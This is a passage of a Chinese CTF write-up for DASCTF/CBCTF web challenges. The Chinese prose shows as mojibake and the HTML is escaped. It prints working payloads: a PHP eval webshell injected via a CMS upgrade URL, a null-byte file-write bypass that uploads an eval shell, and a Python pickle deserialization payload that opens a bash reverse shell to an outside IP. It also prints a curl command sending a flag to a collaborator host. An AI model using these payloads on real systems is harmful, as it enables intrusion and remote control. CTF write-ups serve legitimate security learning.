&lt;pre tabindex="0">&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png" alt="image-20210804220302331">&lt;/p>
&lt;p>å°†ðŸŽå†™è¿›çš„ç›®æ ‡é¡µé¢&lt;code>/runtime/client_upgrade_edition.php&lt;/code>è¿žå…¥èšå‰‘ æ‹¿flagå³å¯&lt;/p>
&lt;p>â€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™æˆ‘å…¶å®žæ˜¯æ²¡æœ‰æœåˆ°&lt;a href="https://ma4ter.cn/2527.html">é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡&lt;/a>è¿™ç¯‡çš„ï¼Œå½“æ—¶æ€è·¯æ˜¯åœ¨åŽå°åœ¨æ‰¾æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ç›´æŽ¥å†™ðŸŽ ï¼Œå½“æ—¶æ‰¾çš„æ˜¯ç‹¬ç«‹é¡µç®¡ç†ï¼Œå°è¯•uploadï¼Œä½†æ˜¯å¹¶ä¸å¤ªè¡Œï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ï¼Œç„¶åŽä¹Ÿæ²¡åŽ»å®¡ä»£ç ï¼ˆæ‡’ç‹—ï¼‰æ‰€ä»¥ å°±æ²¡å‡ºè¿™ä¸ªé¢˜ï¼ŒçŽ°åœ¨çœ‹è¿˜æ˜¯ç–å¿½äº† ç¡®å®žå®Œå…¨æ²¡æ³¨æ„åˆ°ç³»ç»Ÿåœ¨çº¿å‡çº§è¿™ä¸ªæ¨¡å—æ˜¯å¯ç”¨çš„ ä¹Ÿæ²¡æœ‰è®¤çœŸçš„åˆ†æžæºç  æˆ‘çš„è¿‡&lt;/p>
&lt;h2 id="å®‰å…¨å®‰å…¨è¿˜æ˜¯xxxçš„å®‰å…¨">å®‰å…¨,å®‰å…¨,è¿˜æ˜¯xxxçš„å®‰å…¨&lt;/h2>
&lt;blockquote>
&lt;p>æŸä¸ªç‰¹åˆ«å®‰å…¨çš„å•†åº—&lt;/p>
&lt;p>Hint:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;users&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span> &lt;span style="color:#00a8c8">NOT&lt;/span> &lt;span style="color:#00a8c8">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span> &lt;span style="color:#00a8c8">UNIQUE&lt;/span> &lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;login_password&amp;#34;&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;money&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;pay_password&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flag_num&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#00a8c8">PRIMARY&lt;/span> &lt;span style="color:#00a8c8">KEY&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;flaaaaaaaaag&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flllllllag&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>ç‰¹åˆ«ç®€é™‹çš„å‰ç«¯ï¼Œæœ‰ç™»å½•å’Œæ³¨å†Œå’Œä¸»é¡µä¸‰ä¸ªé¡µé¢ï¼Œç™»å½•å¤„æœ‰ä¸€å®šè¿‡æ»¤ å­˜åœ¨sqli&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133701306.png" alt="image-20210801133701306">&lt;/p>
&lt;p>ä»»æ„æ³¨å†Œè´¦å·ï¼Œèµ°ä¸€æ³¢æµç¨‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133748445.png" alt="image-20210801133748445">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133808970.png" alt="image-20210801133808970">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133825487.png" alt="image-20210801133825487">&lt;/p>
&lt;p>&lt;del>ðŸ˜…èšŒåŸ ä½äº†&lt;/del>&lt;/p>
&lt;p>å›žè¿‡å¤´æ¥çœ‹ä¸€ä¸‹Burpå¯¹åˆšæ‰æ“ä½œçš„æŠ“åŒ…ç»“æžœï¼Œä»Žcookieå¯ä»¥çŸ¥é“åŽç«¯æ˜¯flaskæ¡†æž¶ ï¼Œflaskçš„è¯ä¸€èˆ¬æ ‡é…sqliteæ•°æ®åº“ï¼Œç„¶åŽçœ‹ä¸‹é¡µé¢æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805142343684.png" alt="image-20210805142343684">&lt;/p>
&lt;p>æ³¨å†Œæ—¶ç”¨postæäº¤ä¿¡æ¯ï¼Œå¯†ç éƒ¨åˆ†ç”¨çš„æ˜¯&lt;code>md5(app.users.password+'CBCTF')&lt;/code>ï¼Œæ”¯ä»˜å¯†ç æ˜¯&lt;code>encrsa(app.users.pay_password)&lt;/code>ï¼Œå¥½å®¶ä¼™ è¿™ä¸ªåŠ å¯† pay_passwordéƒ¨åˆ†md5+rsa+b64&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>â€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™åŸºæœ¬å°±åœåˆ°è¿™é‡Œäº†ï¼Œæ„Ÿè§‰æ˜¯sqli ä½†æ˜¯ä¸çŸ¥é“æ€Žä¹ˆæ³¨ å…¨æ˜¯md5çš„ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒ&lt;a href="https://www.cnblogs.com/erR0Ratao/p/15088223.html">wp&lt;/a>ä¹‹åŽçš„å¤çŽ°&lt;/p>
&lt;p>èµ›åŽè®²é¢˜çš„æ—¶å€™ å‡ºé¢˜å¸ˆå‚…è¯´å‚è€ƒçš„æ˜¯è¿™ä¸€ç¯‡æ–‡ç« &lt;a href="http://cache.baiducontent.com/c?m=DKJpowjfS-VrxBDrvlkdWFgbk_gnjyP0HEBWJljdQEQ9V3LlYgD1_bfav9DjmFclDejSpHzx5A9kyWFfTVUYm0bX6pNmtyBsxwPjYx-C3KRb_L2YzCoKogiCFXWcyV80EQ5dcXMLFlkbGHr_-te4xQbrgVm2Sd2UKx-_aXSrxQZ-IEBexIZkQCHg53QbTNdTQkH1IHgj_ozoB9uq12JYdR54wSPrMDwCK9QMq-qhRNa&amp;amp;p=8734d15e8cd012a05abd9b7d0c1093&amp;amp;newp=8478c915d9c040a911a2c7710f0588231610db2151d6d1126b82c825d7331b001c3bbfb423291b07d6c27a6c01aa485ae9f23073330923a3dda5c91d9fb4c57479c168&amp;amp;s=cfcd208495d565ef&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=%CA%FD%BE%DD%BC%D3%C3%DC%BB%F2%B3%C9WAF%CA%A7%D0%A7%D7%EE%B4%F3%D4%AA%D0%D7&amp;amp;qid=e0c153e70004188f&amp;amp;p1=1">æ•°æ®åŠ å¯†æˆ–æˆWAFå¤±æ•ˆæœ€å¤§å…ƒå‡¶â€¦&lt;/a>ï¼ˆåŽŸå¸–è¢«404äº† åªæœ‰ä¸ªå¿«ç…§ è¿˜æ˜¯ç™¾åº¦å¿«ç…§æ‰èƒ½çœ‹ è€Œä¸”æ²¡å›¾ï¼‰æ ¸å¿ƒæ˜¯è¿™ä¸€æ®µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805151726564.png" alt="image-20210805151726564">&lt;/p>
&lt;p>è¿™ä¸ªé¢˜çš„flagè´­ä¹°å°ç«™ï¼Œå¯¹pay_passwordæ˜¯è¿›è¡Œå‰ç«¯md5+rsa+b64åŠ å¯†ï¼ŒåŽç«¯å†å¯¹åº”ç€æ‹¿ç§é’¥è§£å¯†ï¼Œå­˜å…¥æ•°æ®åº“çš„æ˜¯md5å€¼ï¼Œçœ‹ä¼¼å¾ˆå®Œç¾Ž ä½†æ˜¯å…¶å®žæ ¹æœ¬æ²¡æœ‰wafçš„ä»‹å…¥ æ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå¦‚æžœæˆ‘ä»¬ä»Žä¸­é—´ä»‹å…¥ åªä¿ç•™rsa+b64çš„éƒ¨åˆ† å°±å¯ä»¥ä»»æ„æŽ§åˆ¶å‚æ•°è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„æ•ˆæžœ&lt;/p>
&lt;p>å…¬é’¥åœ¨ç½‘é¡µæºç ä¸­å·²ç»ç»™å‡ºï¼Œæ•°æ®è¡¨çš„ç»“æžœä¹Ÿå·²ç»åœ¨Hintä¸­äº†ï¼Œç”¨cyberchefä¸€æŠŠæ¢­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805153732476.png" alt="image-20210805153732476">&lt;/p>
&lt;p>é‡æ–°æ³¨å†Œä¸ªè´¦å·ï¼Œåªä¿®æ”¹ä¸€ä¸‹usernameå³å¯ passwdä¸ç”¨å˜ å°†pay_passwordä¿®æ”¹ä¸ºä¸Šé¢ç”Ÿæˆçš„å€¼ï¼Œç™»é™†åŽå³å¯çœ‹åˆ°flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805152706585.png" alt="image-20210805152706585">&lt;/p>
&lt;h2 id="jjs-camera">jj&amp;rsquo;s camera&lt;/h2>
&lt;blockquote>
&lt;p>jjåœ¨æŸæ¬¡ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¸­å‘çŽ°äº†ä¸ªé»‘å®¢åšçš„ç½‘ç«™ï¼Œè¯·ä½¿ç”¨httpsè®¿é—®ç«™ç‚¹&lt;/p>
&lt;p>Hint: ç½‘ä¸Šèƒ½æœåˆ°æºç ï¼Œä»…ä¿®æ”¹äº†å‰ç«¯uiï¼Œæ³¨æ„æœåŠ¡å™¨çš„å“åº”&lt;/p>
&lt;/blockquote>
&lt;p>ä¹Ÿæ˜¯å·²æœ‰çš„ä¸œè¥¿ ä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡æœåˆ°æºç ï¼ˆå°´å°¬ï¼‰æºç åœ¨è¿™é‡Œï¼š&lt;a href="https://www.heibai.org/post/2002.html">åœ¨å—å®è´ï¼Ÿä½ ç‚¹å¼€è¿™ä¸ªç½‘å€çœ‹çœ‹[æ‰“å¼€ç½‘ç«™å·æ‹ç…§ç‰‡]&lt;/a> | &lt;a href="https://www.heibai.org/post/1630.html">ç‚¹å¼€ä¸€ä¸ªç½‘å€æˆ‘è¢«è®°å½•äº†ipè¿˜å·æ‹äº†ç…§ç‰‡&lt;/a>&lt;/p>
&lt;p>ï¼ˆæˆ‘è¿™ä¸ªæ™ºå•†çœŸçš„æ˜¯è´Ÿæ•°èµ·æ­¥çš„ ä¸Šé¢è¿™ä¸¤ä¸ªå¸–å­æˆ‘çœ‹äº†å¥½ä¹… æ‰ååº”è¿‡æ¥è¿™ä¸ªé’“é±¼ç½‘ç«™æ˜¯è¦å¹²å•¥ã€‚ã€‚ã€‚ã€‚&lt;/p>
&lt;p>å‰ç«¯æ˜¯ä¸€ä¸ªé“¾æŽ¥ç”Ÿæˆç«™ ä¸­é—´å¯ä»¥åŠ ä¸€ä¸ªidçš„å‚æ•°ï¼Œè®¿é—®åŽä¼šè‡ªåŠ¨è°ƒç”¨æ‘„åƒå¤´ï¼ˆä½†æ˜¯ä¼šæœ‰ä¸ªæç¤ºçš„å¼¹çª—ï¼‰ï¼Œå…ˆæ‹ç…§å†ç›¸åº”é“¾æŽ¥ï¼Œä¹‹åŽå¯ä»¥åˆ°å…ˆå‰çš„é¡µé¢æŸ¥çœ‹æ‹åˆ°çš„ç…§ç‰‡ï¼Œæ•°æ®ä»¥postçš„å½¢å¼ä¸Šä¼ è‡³/qbl.php?id=xxx&amp;amp;url=xxxï¼Œè¿™æ˜¯qbl.phpçš„æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$base64_img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;img&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$up_dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;./img/&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//å­˜æ”¾åœ¨å½“å‰ç›®å½•çš„imgæ–‡ä»¶å¤¹ä¸‹
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0777&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^(data:\s*image\/(\w+);base64,)/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#111">$type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;bmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;png&amp;#39;&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#111">$new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;_&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">date&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;mdHis_&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$new_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>file_put_contents()æ‰§è¡Œæ–‡ä»¶å†™å…¥ï¼Œå†…å®¹å¯æŽ§+è·¯å¾„å·²çŸ¥ï¼Œè¿‡æ»¤çš„ç‚¹åœ¨äºŽåŽç¼€åæ˜¯bmpæˆ–png å¹¶ä¸”åªæœ‰é™¤åŽ»åŽç¼€çš„è¿™æ–‡ä»¶åå¯æŽ§ï¼Œphpç‰ˆæœ¬æ˜¯5.2.17ï¼Œç”¨00æˆªæ–­ç»•è¿‡ï¼ˆpostéƒ¨åˆ†è¦urlencodeä¸€ä¸‹ burpæˆ–è€…hackbarå°±ç›´æŽ¥è½¬äº†&lt;/p>
&lt;pre tabindex="0">&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/">wp&lt;/a>&lt;/p>
&lt;h2 id="easyweb">easyweb&lt;/h2>
&lt;p>æœ‰ä¸€ä¸ªdockerçš„é™„ä»¶å’Œä¸€äº›æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160437216.png" alt="image-20210805160437216">&lt;/p>
&lt;p>é¦–é¡µå°±æ˜¯ä¸ªç™½åº•é»‘å­—çš„Hello Worldï¼Œå®¡ä¸‹æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160540313.png" alt="image-20210805160540313">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160627110.png" alt="image-20210805160627110">&lt;/p>
&lt;p>ç›´æŽ¥æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼ˆå› ä¸ºè¿™é‡Œæ¶‰åŠåˆ°sessionçš„è°ƒç”¨ æ‰€ä»¥åœ¨.vscodeä¸­çš„launch.jsonå¤„æ·»åŠ ä¸€ä¸ªconfiguration: &lt;code>&amp;quot;justMyCode&amp;quot;: false&lt;/code>è¿™æ ·å¯ä»¥åœ¨è°ƒç”¨å †æ ˆå¤„çœ‹åˆ°å®Œæ•´çš„è°ƒç”¨æƒ…å†µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805180835775.png" alt="image-20210805180835775">&lt;/p>
&lt;p>å¯ä»¥æ³¨æ„åˆ°æ¯æ¬¡åˆ·æ–°ä¹‹åŽ sessionçš„å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ç”Ÿæˆè¿™ä¸ªsessionæ—¶è°ƒç”¨äº†dumpsæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜å°±æ˜¯ååºåˆ—åŒ–çš„å¥—è·¯å•¦&lt;/p>
&lt;p>payloadæœ‰ä¸¤ç§å§ åå¼¹shell æˆ–è€…æž„é€ post/getè¯·æ±‚åˆ°è‡ªå·±å¯ä»¥æŽ¥æ”¶åˆ°çš„å¹³å°ä¸Šï¼Œä¹Ÿéƒ½æ˜¯å¸¸è§„åšæ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/175.24.73.30/2333 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">,))&lt;/span> &lt;span style="color:#75715e">#reduceå¿…é¡»è¿”å›žå…ƒç»„æˆ–å­—ç¬¦ä¸²&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">hello_world&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;233&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;2333&amp;#34;&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Hello World!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æž„é€ è¯·æ±‚çš„è¯è¿˜æ˜¯è€æœ‹å‹~~ burp collaborator~~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl &lt;span style="color:#d88200">&amp;#34;xxxxxx.burpcollaborator.net/`readflag`&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="http://www.snowywar.top/wp-content/uploads/2021/08/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%A4%A9%E5%9B%A2WriteUP.pdf">wp&lt;/a>&lt;/p>
&lt;h2 id="easyjava">easyjava&lt;/h2>
&lt;p>java æ ¹æœ¬ä¸ä¼š&lt;/p>
&lt;p>æ”¾ä¸ªå‚è€ƒé“¾æŽ¥ æºœäº†ï¼š&lt;a href="https://blog.csdn.net/solitudi/article/details/119322658?spm=1001.2014.3001.5501">wp1&lt;/a> &lt;a href="https://ha1c9on.top/2021/08/02/dasctf-2021-07/">wp2&lt;/a>&lt;/p>
&lt;hr>
&lt;p>æœ€è¿‘åœ¨æ€»ç»“ååºåˆ—åŒ–æœ‰å…³çš„ä¸œè¥¿ï¼Œæƒ³æŠŠphp, python, javaçš„ååºåˆ—åŒ– åšè¿‡çš„ä¸œè¥¿æ€»ç»“æ€»ç»“ï¼Œä½†è¿˜æ˜¯æˆ‘æƒ³å¾—å¤ªç®€å•äº† ä¸€ä¸ªphpçš„ååºåˆ—åŒ–å°±æœ‰å¥½å¤šå¥½å¤šä¸œè¥¿ï¼ˆè£…æ­»ï¼‰&lt;/p>
&lt;p>äº‰å–æ—©æ”¶å·¥å§ï¼Œè¿˜æœ‰upload, xss, csrf, sqli&amp;hellip;&amp;hellip;ç­‰ç€æ€»ç»“ è¿˜æœ‰è¶…çº§å¤šä¸œè¥¿è¦å­¦è¦çœ‹&lt;/p>
&lt;p>å­¦ä¹ å¥½è€¶ï¼Ïƒ`âˆ€Â´)&lt;/p></description></item><item><title>CybricsCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</link><pubDate>Thu, 29 Jul 2021 17:02:12 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</guid><description>&lt;h2 id="mic-check-cyber-baby-50-pts">Mic Check (Cyber, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
